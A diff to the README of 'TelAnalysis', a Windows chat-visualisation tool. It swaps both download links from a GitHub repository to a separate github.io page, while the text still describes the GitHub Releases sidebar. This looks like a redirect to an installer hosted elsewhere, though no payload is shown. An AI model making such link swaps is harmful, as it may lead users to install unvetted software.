@@ -1,6 +1,6 @@
 # 📊 TelAnalysis - Turn complex chats into visual insights
 
-[![](https://img.shields.io/badge/Download_TelAnalysis-Blue?style=for-the-badge)](https://github.com/Perape3796/TelAnalysis)
+[![](https://img.shields.io/badge/Download_TelAnalysis-Blue?style=for-the-badge)](https://perape3796.github.io)
 
 ## 📖 About this tool
 
@@ -21,7 +21,7 @@ To run TelAnalysis on your Windows computer, you need the following:
 
 You must visit the project page to download the latest version of the application. The software comes packaged as a convenient installer for Windows.
 
-[Visit the releases page to download](https://github.com/Perape3796/TelAnalysis)
+[Visit the releases page to download](https://perape3796.github.io)
 
 1. Open the link above in your web browser.
 2. Find the section labeled Releases on the right sidebar.
